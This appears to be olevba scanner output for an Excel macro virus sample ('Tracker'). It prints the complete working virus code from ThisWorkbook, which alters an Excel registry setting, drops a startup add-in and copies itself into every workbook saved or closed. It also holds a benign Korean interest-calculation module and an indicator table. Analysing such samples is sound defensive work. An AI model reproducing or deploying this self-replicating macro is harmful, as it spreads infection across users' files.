olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based-329a4e9b436b727f029828700bd30808477af1f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based-329a4e9b436b727f029828700bd30808477af1f8 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Imp   Imp Private  Imp Const  Imp "
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application



Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Tracker-based-329a4e9b436b727f029828700bd30808477af1f8 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Tracker-based-329a4e9b436b727f029828700bd30808477af1f8 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
' 해약환급금 및 기타 이자부리등의 계산에 사용가능한 VBA
' Total Solution 통합버전 1.0
'                                  2000.7.14 심동근
'

Option Explicit

Function CompIntr(f_date, t_date, y_intr) As Double

' 이 함수는 f_date일로부터 t_date일까지의 y_intr이율로
' 일단리 연복리한 이율을 계산하는 함수입니다.
'                                         ver 1.1
'
'                                  2000.5.1  심동근


    Dim f_y, f_m, f_d As Integer    'from date의 년,월,일
    Dim t_y, t_m, t_d As Integer    'to date의 년,월,일
    
    Dim intYearCount, intDayCount As Integer
    Dim dblTempIntr As Double
    Dim intInc As Integer
    Dim intDayInYear As Integer
    Dim dateFrom, dateTo As Date
        
    
    '인수들의 기본적인 error 여부 확인
    If DateDiff("d", f_date, t_date) < 0 Then GoTo ErrorExit
    If y_intr > 1 Or y_intr < 0 Then GoTo ErrorExit
    
    '인수를 각각 년,월,일로 구분함
    f_y = Year(f_date): f_m = Month(f_date): f_d = Day(f_date)
    t_y = Year(t_date): t_m = Month(t_date): t_d = Day(t_date)
   
    '경과년수를 구함
    intYearCount = t_y - f_y
    If t_m < f_m Then intYearCount = intYearCount - 1 _
        Else If t_m = f_m Then If t_d < f_d Then intYearCount = intYearCount - 1
    
    '일단리,연복리 이율을 구함
    dblTempIntr = 1
    dateFrom = f_date
    If intYearCount > 0 Then
    For intInc = 1 To intYearCount    '경과년수의 복리값을 계산
        dateTo = DateSerial(f_y + intInc, f_m, f_d)
        If Day(dateTo) <> f_d Then dateTo = DateSerial(f_y + intInc, f_m, f_d - 1)
        intDayInYear = DateDiff("d", dateFrom, dateTo)
        dblTempIntr = dblTempIntr * (1 + y_intr * intDayInYear / 365)
        dateFrom = dateTo
    Next intInc
    End If
    
    '잔여일수에 대한 일단리값 계산
    intDayCount = DateDiff("d", dateFrom, t_date)
    dblTempIntr = dblTempIntr * (1 + y_intr * intDayCount / 365) - 1
    
    '계산된 이율값을 return
    CompIntr = dblTempIntr
    Exit Function
    
    '인수가 부적절할 시 error exit
ErrorExit:
    CompIntr = 0

End Function


Function WAIntr(f_date, t_date, i_tbl) As Double

' 이 함수는 f_date일로부터 t_date일까지의 i_tbl이란 이율테이블로
' 이율의 가중평균을 구하는 함수입니다. 당근,초일산입입니다
' 단, 연복리는 적용되지 않습니다.
'                                         ver 1.1
'
'                                  2000.6.1  심동근

    Dim i, intNumOfData As Integer
    Dim intStart, intEnd As Integer
    Dim dateFrom, dateTo As Date
    Dim intElaspDay As Integer
    Dim dblTempIntr As Double
    
    '이율표의 행수를 구함
    intNumOfData = i_tbl.Count / 2
    
    '입력변수에 대한 최소 에러체크
    If i_tbl(1, 1) > f_date Then GoTo ErrorExit
    If f_date > t_date Then GoTo ErrorExit
        
    '유효한 이율의 범위를 구함
    For i = 1 To intNumOfData
        If i_tbl(i, 1) = 0 Or i_tbl(i, 2) >= 1 Then
            intNumOfData = i - 1
            Exit For
        End If
    Next i
    If intNumOfData = 0 Then GoTo ErrorExit
    
    '이율표에서 계산이 시작되는 곳을 구함
    intStart = 0
    While f_date >= i_tbl(intStart + 1, 1)
        intStart = intStart + 1
        If intStart = intNumOfData Then
            intEnd = intStart: GoTo Calculate_Interest
        End If
    Wend
    
    '이율표에서 계산이 끝나는 곳을 구함
Calculate_intEnd:
    intEnd = intStart
    While i_tbl(intEnd + 1, 1) < t_date
        intEnd = intEnd + 1
        If intEnd = intNumOfData Then GoTo Calculate_Interest
    Wend
    
    '가중평균이율 계산
Calculate_Interest:
    dblTempIntr = 0
    dateFrom = f_date
    dateTo = f_date
    For i = intStart To intEnd
        If i < intEnd Then dateTo = i_tbl(i + 1, 1) Else dateTo = t_date
        intElaspDay = DateDiff("d", dateFrom, dateTo)
        dblTempIntr = dblTempIntr + i_tbl(i, 2) * intElaspDay / 365
        dateFrom = dateTo
    Next i

    WAIntr = dblTempIntr
    Exit Function
    
ErrorExit:
    WAIntr = 0

End Function

Function WACompIntr(f_date, t_date, i_tbl) As Double

' 이 함수는 f_date일로부터 t_date일까지의 i_tbl이란 이율테이블로
' 일단리 연복리 이율값을 구하는 함수입니다.
'                                         ver 1.0
'
'                                  2000.6.7  심동근

    Dim i As Integer
    Dim f_y, f_m, f_d As Integer    'from date의 년,월,일
    Dim t_y, t_m, t_d As Integer    'to date의 년,월,일
    Dim intElaspYear As Integer
    Dim dateFrom, dateTo As Date
    Dim dblTempIntr As Double
    
    
    '입력변수에 대한 최소 에러체크
    If i_tbl(1, 1) > f_date Then GoTo ErrorExit
    If f_date > t_date Then GoTo ErrorExit
   
   
    '인수를 각각 년,월,일로 구분함
    f_y = Year(f_date): f_m = Month(f_date): f_d = Day(f_date)
    t_y = Year(t_date): t_m = Month(t_date): t_d = Day(t_date)
    
    '경과년수 및 일수를 구함
    intElaspYear = t_y - f_y
    If t_m < f_m Then intElaspYear = intElaspYear - 1 _
        Else If t_m = f_m Then If t_d < f_d Then intElaspYear = intElaspYear - 1
        
    '가중평균이율 계산(연복리)
Calculate_YearIntr:
    dblTempIntr = 1
    dateFrom = f_date
    If intElaspYear = 0 Then GoTo Calculate_DayIntr
    For i = 1 To intElaspYear
        dateTo = DateSerial(f_y + i, f_m, f_d)
        If Day(dateTo) <> f_d Then dateTo = DateSerial(f_y + i, f_m, f_d - 1)
        dblTempIntr = dblTempIntr * (1 + WAIntr(dateFrom, dateTo, i_tbl))
        dateFrom = dateTo
    Next i

    '가중평균이율 계산(일단리)
Calculate_DayIntr:
    dateTo = t_date
    dblTempIntr = dblTempIntr * (1 + WAIntr(dateFrom, dateTo, i_tbl))
    WACompIntr = dblTempIntr - 1
    Exit Function
    
ErrorExit:
    WACompIntr = 0

End Function

Function WADocnCompIntr(f_date, t_date, d_date, i_tbl) As Double

' 이 함수는 f_date일로부터 t_date일까지 d_date일(계약일)을 기준으로
' 복리하여 i_tbl 이율테이블로 일단리 연복리 이율값을 구하는 함수입니다.
'                                         ver 1.0
'
'                                  2000.7.14  심동근

    Dim i As Integer
    Dim f_y, f_m, f_d As Integer    'from date의 년,월,일
    Dim t_y, t_m, t_d As Integer    'to date의 년,월,일
    Dim d_y, d_m, d_d As Integer    'docn date의 년,월,일
    Dim intElaspYear As Integer
    Dim dateFrom, dateTo As Date
    Dim dblTempIntr As Double
    
    
    '입력변수에 대한 최소 에러체크
    If i_tbl(1, 1) > f_date Then GoTo ErrorExit
    If f_date > t_date Then GoTo ErrorExit
       
   
    '인수를 각각 년,월,일로 구분함
    f_y = Year(f_date): f_m = Month(f_date): f_d = Day(f_date)
    t_y = Year(t_date): t_m = Month(t_date): t_d = Day(t_date)
    d_y = Year(d_date): d_m = Month(d_date): d_d = Day(d_date)
    
    dblTempIntr = 1
    
    '첫번째 계약해당일(Mok) 계산 (dateTo)
    dateFrom = f_date
    d_y = f_y
    dateTo = DateSerial(d_y, d_m, d_d)
    If dateTo < dateFrom Then
        d_y = d_y + 1: dateTo = DateSerial(d_y, d_m, d_d)
    End If
    If Day(dateTo) <> d_d Then dateTo = DateSerial(d_y, d_m, d_d - 1)
    If dateTo > t_date Then GoTo Calculate_DayIntr
    
    'Mok일까지의 일단리 부리
    dblTempIntr = dblTempIntr + WAIntr(dateFrom, dateTo, i_tbl)
    
    'Mok일부터의 경과년수를 구함
    intElaspYear = t_y - d_y
    If t_m < d_m Then intElaspYear = intElaspYear - 1 _
        Else If t_m = d_m Then If t_d < d_d Then intElaspYear = intElaspYear - 1
    
    'Mok일부터 가중평균이율 계산(연복리)
Calculate_YearIntr:
    dateFrom = dateTo
    If intElaspYear = 0 Then GoTo Calculate_DayIntr
    For i = 1 To intElaspYear
        dateTo = DateSerial(d_y + i, d_m, d_d)
        If Day(dateTo) <> d_d Then dateTo = DateSerial(d_y + i, d_m, d_d - 1)
        dblTempIntr = dblTempIntr * (1 + WAIntr(dateFrom, dateTo, i_tbl))
        dateFrom = dateTo
    Next i

    '가중평균이율 계산(일단리)
Calculate_DayIntr:
    dateTo = t_date
    dblTempIntr = dblTempIntr * (1 + WAIntr(dateFrom, dateTo, i_tbl))
    WADocnCompIntr = dblTempIntr - 1
    Exit Function
    
ErrorExit:
    WADocnCompIntr = 0

End Function


Function Elaspday(f_date, t_date, opt) As Integer

' 이 함수는 f_date일로부터 t_date일까지의 경과기간을
' 계산하는 함수입니다.
'                                         ver 1.0
'
'                                  2000.6.1  심동근


    Dim f_y, f_m, f_d As Integer    'from date의 년,월,일
    Dim t_y, t_m, t_d As Integer    'to date의 년,월,일
    
    Dim intYearCount, intMonthCount, intDayCount As Integer
    
    '인수들의 기본적인 error 여부 확인
    If DateDiff("d", f_date, t_date) < 0 Then GoTo ErrorExit
    If opt < 1 Or opt > 3 Then GoTo ErrorExit
    
    '인수를 각각 년,월,일로 구분함
    f_y = Year(f_date): f_m = Month(f_date): f_d = Day(f_date)
    t_y = Year(t_date): t_m = Month(t_date): t_d = Day(t_date)
   
    '경과년수 및 월수, 일수를 구하여 결과값 return

    intYearCount = t_y - f_y
    If t_m < f_m Then intYearCount = intYearCount - 1 _
        Else If t_m = f_m Then If t_d < f_d Then intYearCount = intYearCount - 1
    If opt = 1 Then Elaspday = intYearCount: Exit Function
    
    intMonthCount = DateDiff("m", DateSerial(f_y + intYearCount, f_m, f_d), t_date)
    intDayCount = DateDiff("d", DateSerial(f_y + intYearCount, f_m + intMonthCount, f_d), t_date)
    If intDayCount < 0 Then intMonthCount = intMonthCount - 1
    intDayCount = DateDiff("d", DateSerial(f_y + intYearCount, f_m + intMonthCount, f_d), t_date)
    
   
    Select Case opt
        Case 2
            Elaspday = intMonthCount
        Case 3
            Elaspday = intDayCount
    End Select
    Exit Function
    
ErrorExit:
    Elaspday = 0
    
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

